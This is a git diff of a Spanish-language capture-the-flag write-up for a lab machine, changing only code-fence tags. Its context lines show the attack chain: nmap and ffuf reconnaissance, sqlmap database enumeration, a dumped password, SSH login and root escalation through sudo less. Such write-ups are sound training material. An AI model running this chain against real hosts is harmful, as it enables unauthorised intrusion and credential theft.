@@ -29,7 +29,7 @@ sudo nmap -p- -Pn -sS -n --min-rate 5000 192.168.56.104 --open
 ```
 Resultados:
 
-```
+```bash
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
@@ -54,7 +54,7 @@ El sitio indica el uso de sistemas antiguos:
 Esto sugiere posibles vulnerabilidades en componentes legacy.
 
 ### 2.3 Fuzzing
-```
+```bash
 ffuf -u http:<ip>/FUZZ -w /opt/seclists/Discovery/Web-Content/common.txt
 ```
 Se realiza fuzzing y se encuentra el archivo `robots.txt`:
@@ -90,7 +90,7 @@ Se automatiza la explotación con sqlmap.
 
 ### Listar bases de datos
 
-```
+```bash
 sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" --batch --dbs
 ```
 
@@ -103,13 +103,13 @@ available databases [2]:
 ```
 ### 3.3 Enumeración de tablas
 
-```
+```bash
 sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" -D crimson_db --tables --batch
 ```
 
 Resultado:
 
-```
+```bash
 Database: crimson_db
 
 [2 tables]
@@ -133,13 +133,13 @@ edward : alchemy123
 
 ### 3.5 Acceso inicial (SSH)
 
-```
+```bash
 ssh edward@192.168.56.104
 ```
 
 Dentro del sistema:
 
-```
+```bash
 ls
 ```
 
@@ -160,7 +160,7 @@ He said he stored the final copy somewhere safer, but root still keeps the maste
 
 Se listan archivos ocultos:
 
-```
+```bash
 ls -la
 ```
 
@@ -174,7 +174,7 @@ Este archivo contiene credenciales del usuario **alphonse**.
 
 Se accede:
 
-```
+```bash
 su alphonse
 ```
 
@@ -186,7 +186,7 @@ su alphonse
 
 Se revisan permisos:
 
-```
+```bash
 sudo -l
 ```
 
@@ -201,7 +201,7 @@ User alphonse may run the following commands on Crimson-Transmutation:
 
 Se ejecuta:
 
-```
+```bash
 sudo /usr/bin/less /etc/crimson-maintenance.log
 ```
 
@@ -213,7 +213,7 @@ Dentro de `less`:
 
 ### 4.3 Root
 
-```
+```bash
 whoami
 ```
 
